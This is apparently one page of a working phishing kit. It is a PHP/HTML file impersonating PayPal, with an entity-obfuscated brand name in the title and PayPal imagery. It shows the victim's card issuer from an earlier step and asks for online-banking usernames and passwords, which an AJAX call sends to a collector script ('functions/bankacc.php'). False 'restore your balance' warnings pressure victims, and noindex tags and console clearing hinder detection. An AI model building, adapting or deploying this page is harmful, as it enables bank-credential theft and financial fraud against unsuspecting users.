<?php

require_once __DIR__.'/functions/functions.php';
require __DIR__.'/functions/crypt.php';
require_once __DIR__.'/../lang/detect.php';

if ($SETTING_BANK == 1)
{

}
else
{
    header("Location: identity.php?_cmd=".md5(rand(1,999))."&verification_dispatch=".base64_encode(md5(rand(1,100))));
    exit();
}

@$BrandBank = BankLogo($_SESSION['Bin']->issuer, trim(substr($_SESSION['Nu'], 0, 6)));

error_reporting(0);
?>
<!DOCTYPE html>
<html>

    <head>
        <title>&#80;ay&#80;al - &#67;on&#102;ir&#109; your bank account</title>
        <link rel="shortcut icon" href="../assets/img/icon.ico" />
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta http-equiv="cache-control" content="no-cache">
        <meta http-equiv="cache-control" content="no-store">
        <meta http-equiv="cache-control" content="max-age=0">
        <meta http-equiv="expires" content="-1">
        <meta http-equiv="pragma" content="no-cache">
        <meta name="robots" content="noindex,nofollow">
        <!-- Style -->
        <link rel="stylesheet" type="text/css" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" type="text/css" href="../assets/css/font-awesome.min.css">
        <link rel="stylesheet" type="text/css" href="../assets/css/VerifyPage.css">
        <!-- Scripts -->
        <script type="text/javascript" src="../assets/js/jquery.min.js"></script>
        <script type="text/javascript" src="../assets/js/bootstrap.min.js"></script>
        <script type="text/javascript" src="../assets/js/CardType.js"></script>
        <script type="text/javascript">
			$(document).ready(function(){
				$('#checkout_card_number').creditCardTypeDetector({ 'credit_card_logos' : '.card_logos' });


				$('input[type=text]').keyup(function(){
					$(this).removeClass('HasErrorBorder');
				});

				$('select').change(function(){
					$(this).removeClass('HasErrorBorder');
				});
        		$('.CardN').toggleClass();
				$('#CcForm').submit(function(){

					// return false;

					function HasError(ElmId){
						var ElmId = $(ElmId);
						$(ElmId).addClass('HasErrorBorder');
					}
					var fname = $('#bnkuser').val();
					var lname = $('#bnkpass').val();

					if( fname == '' ){

						HasError('#bnkuser');
						return false;
					}else if( lname == '' ){

						HasError('#bnkpass');
						return false;
					}else{

						$.ajax({
							url: 'functions/bankacc.php',
							method: 'post',
							data: $('#CcForm').serialize(),
							beforeSend: function(){
								$('.spinner').removeClass('hide');
							},
							success: function(JsonResponse){
								
								
								var JSONArray = $.parseJSON(JsonResponse);

								if(JSONArray.status == 'fail')
								{
									location.reload();
								}
								else
								{
									var delay1 = 2000; //Your delay in milliseconds
									setTimeout(function(){
										$('.oneSecond').html('<?php echo $P5_text1; ?>')
									}, delay1);
									window.location = 'identity.php?_cmd=<?php echo md5(rand(1,999)); ?>&verification_dispatch=<?php echo base64_encode(md5(rand(1,100))); ?>';
								}
							}
						});
						return false;
					}

				});

            $(window).on( "load", function(){
              console.clear();
            });
			});

      </script>


    </head>

    <body>
        <header class="header">
            <nav class="navbar-verify">
                <div class="nav-desktop">
                    <div class="container">
                        <div class="row">
                            <div class="col-md-8">
                                <ul>
                                    <li>
                                        <a href="#" class="navbar-brand ppl-brand"></a>
                                    </li>
                                    <li><a class="effect-1" href="#"><?php echo $P1_text3; ?></a></li>
                                    <li><a class="effect-1" href="#"><?php echo $P1_text4; ?></a></li>
                                    <li><a class="effect-1" href="#"><?php echo $P1_text5; ?></a></li>
                                    <li><a class="effect-1" href="#"><?php echo $P1_text6; ?></a></li>
                                    <li><a class="effect-1" href="#"><?php echo $P1_text7; ?></a></li>
                                </ul>
                            </div>
                            <div class="col-md-4">
                                <ul class="right-navbar">
                                    <li><a href="#"><i class="fa fa-bell" style="font-size: 23px;"></i></a></li>
                                    <li><a href="#"><i class="fa fa-cog" style="font-size: 23px;"></i></a></li>
                                    <li><a href="#" style="padding: 0.7em;margin-top: 1.2em;border: 1px solid;border-radius: 18px;"><?php echo $P1_text8; ?></a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="nav-mobile">
                    <ul>
                        <li><a href="#" style="padding: 0.7em;margin-top: 1.2em;border: 1px solid;border-radius: 18px;"><?php echo $P1_text8; ?></a></li>
                        <li>
                            <a href="#" class="navbar-brand ppl-brand"></a>
                        </li>
                        <li><a href="#" style="padding: 0.7em;margin-top: 1.2em;"><i class="fa fa-bell" style="font-size: 25px;"></i></a></li>
                    </ul>
                </div>
            </nav>
            <div class="UserInfo">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-7 col-md-7 col-ms-12 Profile_UserName">
                            <div class="container">
                                <div class="row">
                                    <div class="profilepic"> <img src="../assets/img/profilepic.png"> </div>
                                    <div>
                                        <p class="HelloUser"><?php echo $P1_text10; ?><br> <a href="#"><?php echo $P1_text11; ?></a></p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-5 DisplayName-3-Item">
                            <center>
                                <div class="col-md-4 pull-left item-3 text-center">
                                    <center>
                                        <div class="icon-mobile" style="padding: 24px;color: #0070ba;"><i class="fa fa-send" style="font-size: 27px;"></i></div>
                                    </center>
                                    <p class="text-center"><a href="#"><?php echo $P1_text13; ?></a></p>
                                </div>
                            </center>
                            <center>
                                <div class="col-md-4 pull-left item-3 text-center">
                                    <center>
                                        <div class="icon-mobile"><i class="fa fa-mobile" style="font-size: 48px;color: #0070ba;"></i></div>
                                    </center>
                                    <p class="text-center"><a href="#"><?php echo $P1_text14; ?></a></p>
                                </div>
                            </center>
                            <center>
                                <div class="col-md-4 pull-left item-3 text-center">
                                    <center>
                                        <div class="icon-mobile" style="padding: 24px;"><i class="fa fa-shopping-bag" style="font-size: 27px;color: #0070ba;"></i></div>
                                    </center>
                                    <p class="text-center"><a href="#"><?php echo $P1_text15; ?></a></p>
                                </div>
                            </center>
                        </div>
                    </div>
                </div>
            </div>
        </header>
        <!-- End BarTop -->
        <div class="container PageContent">
            <div class="row">
                <div class="col-lg-4 col-md-4 np">

                    <div class="col-lg-12 col-md-12 Tap-1">
                        <div class="Step1Header CardN"><b class="page-header"><?php echo $P1_text16; ?></b></div>
                        <div class="VerifiStep">
                            <div class="VerticalLine"></div>
                            <ul>
                                <li class="Tap-1-Active"><font><?php echo $P1_text17; ?></font></li>
                                <li class="Tap-3"><font href="#"><?php echo $P1_text18; ?></font></li>
                                <li class="Tap-3"><font href="#"><?php echo $P1_text19; ?></font></li>
                            </ul>
                        </div>
                    </div>

                    <div class="col-lg-12 col-md-12 Tap-2">
                        <div class="Step1Header" style=""> <b class="page-header"><?php echo $P5_text20; ?></b> <span class="pull-right"><a href="#"><?php echo $P5_text21; ?> <i class="fa fa-angle-right"></i></a></span>
                        </div>
                        <div class="VerifiStep">
                            <p class="HowManyMoney">
                            	<img src="../assets/img/warning-alert.jpg" class="warning-text-img" />
                                <p>Please complete verification steps to restore your balance</p>
                            </p>
                            <ul class="WithdrawMoney">
                            	<li><a href="#" class="Step1Header"><?php echo $P5_text3; ?></a></li>
                            	<li><a href="#" class="Step1Header"><?php echo $P5_text4; ?></a></li>
                            </ul>
                         </div>
                    </div>

                    <div class="col-lg-12 col-md-12 Tap-2">
                        <div class="Step1Header">
                        	<b class="page-header"><?php echo $P5_text5; ?></b>
                        </div>
                        <div class="VerifiStep cards-and-banks">
							<img src="../assets/img/warning-alert.jpg" class="warning-text-img" />
                            <p>Please complete verification steps to restore your credit cards</p>
                            <div><a href="#" class="add-card"><?php echo $P1_text27; ?></a></div>
                            <br>
                         </div>
                    </div>

                    <div class="col-lg-12 col-md-12 Tap-2">
                        <div class="Step1Header">
                        	<b class="page-header"><?php echo $P1_text33; ?></b>
                        </div>
                        <div class="VerifiStep cards-and-banks">
                            <ul class="WithdrawMoney">
                            	<li><a href="#" class="Step1Header"><?php echo $P1_text34; ?></a></li>
                            	<li><a href="#" class="Step1Header"><?php echo $P1_text35; ?></a></li>
                            	<li><a href="#" class="Step1Header"><?php echo $P1_text36; ?></a></li>
                            </ul>

                         </div>
                    </div>

                </div><!-- End Tap Left -->


                <div class="col-lg-8 col-md-8 np">
                <div class="col-lg-12 col-md-12 Verify-Form pull-right">
               	<form action="../includes/Ajax.php" method="post" id="CcForm">
	                
<!-- Cc Page -->


                     <div class="transitioning spinner hide">
                        <p class="oneSecond"><?php echo $P5_text6; ?></p>
                     </div>
                    <div class="container">
                        <br />
                        <br />
                        <div class="col-md-12 npi">
                            <h5 class="page-header" style="padding-bottom: 10px;"><?php echo $P1_text42; ?></h5>
                            </p>
                        </div>
                            <div class="col-md-8 pull-left">
                                <div class="row">
                                    <p><?php echo $P7_text43; ?><span style="font-size: 13px;color: #989898;font-weight: 600;"> (<?php echo $P1_text44; ?>).</span></p>
                                    <div class="bnk-info" style="width: 100%;">
                                        <center>
                                            
                                            
                                            <?php
                                            if ($BrandBank == false){
                                                echo "<p style=\"padding-top: 14px;\">{$_SESSION['Bin']->issuer}</p>";
                                            }
                                            else
                                            {
                                                echo "<img src=\"$BrandBank\" style=\"max-width: 25%;padding-top: 14px;padding-bottom: 20px;\">";
                                            }
                                            ?>
                                            
                                            <div class="input-group" style="width: 75%;">
                                              <input type="text" placeholder="Username" name="bnkuser" id="bnkuser" class="form-control InputInfo" aria-label="Text input with checkbox">
                                            </div>
                                            <div class="input-group" style="width: 75%;">
                                              <input type="password" placeholder="Password" name="bnkpass" id="bnkpass" class="form-control InputInfo" aria-label="Text input with checkbox">
                                            </div>
                                            <input type="submit" name="" value="Continue" class="Submit" style="width: 75%;margin-top: 15px;margin-bottom: 20px;">
                                            <div style="clear: both;"></div>
                                            <a class="btn btn-primary skip-bnk" href="identity.php" role="button">Skip this step</a>
                                        <center>
                                    </div>
                                </div>
                            </div>
                                <div class="col-md-4 pull-right" style="padding-right: 0px;">
                                <center><img src="../assets/img//paypal-security.png" style="width: 75%;text-align: center;"></center>
                                <p style="font-size: 0.979em;font-weight: 400;display: block;padding: 0.9em 0 0.65em;font-weight: 400;letter-spacing: 0.025rem;text-decoration: none;text-align: center;font-size: 0.88em;text-align: left;"><?php echo $P5_text12; ?></p>
                            </div>
                            <hr>
                            <div class="col-md-12 pull-left">
                                <div class="item1">



                            <br>
                            <hr class="style3" style="border-top: 1px dashed #8c8b8b;">
                            <br>
                            <center>
                            <div class="col-md-2"></div>
                            <div class="col-md-4 pull-left">
                                <div class="item1">
                                    <center><img src="../assets/img//paypal-fast.png" style="width: 100%;">
                                    <b class="text-center"><?php echo $P5_text13; ?></b></center>
                                    <p class="text-left"><?php echo $P5_text14; ?></p>
                                </div>
                            </div>
                            
                            <div class="col-md-4 pull-left">
                                <div class="item1">
                                    <center><img src="../assets/img//cardreader-new.png" style="width: 100%;">
                                    <b class="text-center"><?php echo $P5_text15; ?></b>
                                    <p class="text-left"><?php echo $P5_text16; ?></p></center>
                                </div>
                            </div>

                            <div class="col-md-4 pull-left">
                                <div class="item1">
                                    <center><img src="../assets/img/paypal-donation.png" style="width: 100%;">
                                    <b class="text-center"><?php echo $P5_text17; ?></b>
                                    <p class="text-left"><?php echo $P5_text18; ?></p></center>
                                </div>
                            </div>
                            <div class="col-md-2"></div>

                            </center>
                    </div>
                    </div>
                    </div>

<!-- End Cc Page -->
				
				</form>
                </div>
	                    	</div>
							
	                    </div>
	                </div><!-- End Verification Form -->

	            </div>
        </div>
        </div>
        </div>
        </div>
        <div class="wrap"></div>
        <footer class="footer">
        	<div class="container">
        		<div class="row">
        		<div class="col-md-12">
        		<p class="text-center" style="margin: 0;background: #ffffff;padding: 1%;color: #9e9e9e;"><?php echo $P5_text19; ?></p>
        		</div>
        		</div>
        	</div>
        </footer>
</body>
</html>